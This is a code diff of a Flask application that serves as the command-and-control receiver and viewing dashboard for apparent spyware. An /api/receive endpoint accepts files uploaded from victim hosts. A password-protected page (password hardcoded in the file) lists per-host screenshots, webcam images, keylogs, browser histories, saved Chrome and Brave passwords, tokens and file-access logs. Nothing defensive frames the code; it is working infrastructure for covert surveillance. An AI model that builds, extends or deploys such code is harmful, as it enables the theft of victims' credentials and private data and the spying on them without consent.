@@ -1,123 +1,175 @@
-# FILE: app.py
-from flask import Flask, request, render_template_string, send_from_directory
+# app.py
+from flask import Flask, request, render_template_string
 import os
+from werkzeug.utils import secure_filename
 from datetime import datetime
 
 app = Flask(__name__)
+UPLOAD_FOLDER = 'logs'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-PASSWORD = "disha456"
-LOG_DIR = os.path.expanduser("~/logs")
-
-TEMPLATE = """
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🕵 Hacker Dashboard</title>
+    <title>Log Viewer</title>
     <style>
-        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        h1 { color: #0ff; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #0f0; padding: 10px; text-align: left; font-size: 14px; }
-        th { background-color: #222; font-size: 16px; font-weight: bold; }
-        a { color: #0ff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
+        body {
+            background-color: #0f0f0f;
+            color: #00ff00;
+            font-family: Consolas, monospace;
+        }
+        h1 {
+            text-align: center;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            table-layout: fixed;
+        }
+        th, td {
+            border: 1px solid #00ff00;
+            padding: 8px;
+            text-align: center;
+            word-wrap: break-word;
+            font-size: 14px;
+        }
+        th {
+            background-color: #000000;
+            font-size: 16px;
+        }
+        input[type="password"] {
+            background-color: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            margin-top: 20px;
+            width: 200px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        button {
+            background-color: #00ff00;
+            color: #000;
+            padding: 8px 16px;
+            margin-top: 10px;
+            border: none;
+            cursor: pointer;
+        }
+        .screenshot-img {
+            width: 120px;
+        }
     </style>
 </head>
 <body>
-    <h1>📂 Logs in Server</h1>
-    <form method="POST">
-        {% if not authorized %}
-        <input type="password" name="password" placeholder="Enter Password" style="padding:10px;" />
-        <input type="submit" value="Login" style="padding:10px;" />
-        {% endif %}
-    </form>
-    {% if authorized %}
-    <table>
-        <tr>
-            <th>Time</th>
-            <th>User / Host</th>
-            <th>🖼 Screenshot</th>
-            <th>📷 Webcam</th>
-            <th>⌨ Keylogs</th>
-            <th>🔓 Decrypted Keylogs</th>
-            <th>🌐 Chrome History</th>
-            <th>🦁 Brave History</th>
-            <th>🔐 Chrome Passwords</th>
-            <th>🔐 Brave Passwords</th>
-            <th>🪙 Tokens</th>
-            <th>📄 Recent Files</th>
-            <th>📁 File Access</th>
-        </tr>
-        {% for row in logs %}
-        <tr>
-            <td>{{ row.timestamp }}</td>
-            <td>{{ row.user }}</td>
-            {% for col in row.files %}
-            <td>
-                {% if col %}<a href="/download/{{ col }}">{{ col }}</a>{% else %}—{% endif %}
-            </td>
+    {% if not authorized %}
+        <form method="POST">
+            <input type="password" name="password" placeholder="Enter password">
+            <button type="submit">Unlock</button>
+        </form>
+    {% else %}
+        <h1>Logs in Server</h1>
+        <table>
+            <tr>
+                <th>Hostname</th>
+                <th>Time</th>
+                <th> Desktop</th>
+                <th> Webcam</th>
+                <th> Keylogs</th>
+                <th> Decrypted Keylogs</th>
+                <th> Chrome History</th>
+                <th> Brave History</th>
+                <th> Chrome Passwords</th>
+                <th> Brave Passwords</th>
+                <th> Tokens</th>
+                <th> Recent Files</th>
+                <th> File Access</th>
+            </tr>
+            {% for row in rows %}
+            <tr>
+                {% for cell in row %}
+                    <td>
+                        {% if cell.endswith(('.png', '.jpg', '.jpeg')) %}
+                            <img src="{{ url_for('static', filename=cell) }}" class="screenshot-img">
+                        {% elif cell.endswith('.txt') %}
+                            <a href="{{ url_for('static', filename=cell) }}" target="_blank">{{ cell }}</a>
+                        {% else %}
+                            {{ cell }}
+                        {% endif %}
+                    </td>
+                {% endfor %}
+            </tr>
             {% endfor %}
-        </tr>
-        {% endfor %}
-    </table>
+        </table>
     {% endif %}
 </body>
 </html>
-"""
+'''
 
-@app.route("/", methods=["GET", "POST"])
+PASSWORD = "disha456"
+
+@app.route('/', methods=['GET', 'POST'])
 def index():
     authorized = False
-    if request.method == "POST":
-        if request.form.get("password") == PASSWORD:
-            authorized = True
+    if request.method == 'POST' and request.form.get("password") == PASSWORD:
+        authorized = True
     elif request.args.get("auth") == PASSWORD:
         authorized = True
 
-    logs = []
-    if authorized:
-        # Scan log folders
-        for folder in sorted(os.listdir(LOG_DIR), reverse=True):
-            folder_path = os.path.join(LOG_DIR, folder)
-            if not os.path.isdir(folder_path): continue
-            files = os.listdir(folder_path)
-            files_lower = [f.lower() for f in files]
+    if not authorized:
+        return render_template_string(HTML_TEMPLATE, authorized=False)
 
-            logs.append({
-                "timestamp": folder.replace("_", " "),
-                "user": folder.split("_")[0],
-                "files": [
-                    find_file(files, "screenshot"),
-                    find_file(files, "webcam"),
-                    find_file(files, "keylogs_export"),
-                    find_file(files, "decrypted_keylogs"),
-                    find_file(files, "chrome_history"),
-                    find_file(files, "brave_history"),
-                    find_file(files, "chrome_passwords"),
-                    find_file(files, "brave_passwords"),
-                    find_file(files, "token"),
-                    find_file(files, "recent"),
-                    find_file(files, "file_access"),
-                ]
-            })
+    rows = []
+    for folder in sorted(os.listdir(UPLOAD_FOLDER), reverse=True):
+        folder_path = os.path.join(UPLOAD_FOLDER, folder)
+        if not os.path.isdir(folder_path): continue
 
-    return render_template_string(TEMPLATE, authorized=authorized, logs=logs)
+        files = os.listdir(folder_path)
+        cells = [
+            folder.split("_")[0],  # Hostname
+            folder.split("_")[1],  # Time
+            find_file(files, folder_path, "screenshot"),
+            find_file(files, folder_path, "webcam"),
+            find_file(files, folder_path, "keylogs_export.txt"),
+            find_file(files, folder_path, "decrypted_keylogs.txt"),
+            find_file(files, folder_path, "chrome_history.txt"),
+            find_file(files, folder_path, "brave_history.txt"),
+            find_file(files, folder_path, "chrome_passwords.txt"),
+            find_file(files, folder_path, "brave_passwords.txt"),
+            find_file(files, folder_path, "extracted_tokens.txt"),
+            find_file(files, folder_path, "recent_files.txt"),
+            find_file(files, folder_path, "file_access_log.txt"),
+        ]
+        rows.append(cells)
 
-def find_file(files, keyword):
+    return render_template_string(HTML_TEMPLATE, authorized=True, rows=rows)
+
+def find_file(files, folder_path, keyword):
     for f in files:
-        if keyword in f.lower():
-            return f
-    return None
+        if keyword in f:
+            static_path = os.path.join("logs", os.path.basename(folder_path), f)
+            return static_path.replace("\\", "/")
+    return "-"
 
-@app.route("/download/<path:filename>")
-def download(filename):
-    # Scan folders for the file
-    for folder in os.listdir(LOG_DIR):
-        file_path = os.path.join(LOG_DIR, folder, filename)
-        if os.path.exists(file_path):
-            return send_from_directory(os.path.join(LOG_DIR, folder), filename, as_attachment=True)
-    return "File not found", 404
+@app.route('/api/receive', methods=['POST'])
+def receive_logs():
+    try:
+        host = request.form.get("host") or "unknown"
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        foldername = f"{host}_{timestamp}"
+        path = os.path.join(UPLOAD_FOLDER, foldername)
+        os.makedirs(path, exist_ok=True)
+
+        for file_key in request.files:
+            file = request.files[file_key]
+            filename = secure_filename(file.filename)
+            file.save(os.path.join(path, filename))
+
+        return "✅ Logs received", 200
+    except Exception as e:
+        return f"❌ Error: {str(e)}", 500
 
 if __name__ == "__main__":
-    os.makedirs(LOG_DIR, exist_ok=True)
-    app.run(host="0.0.0.0", port=10000)
+    app.run(debug=True)
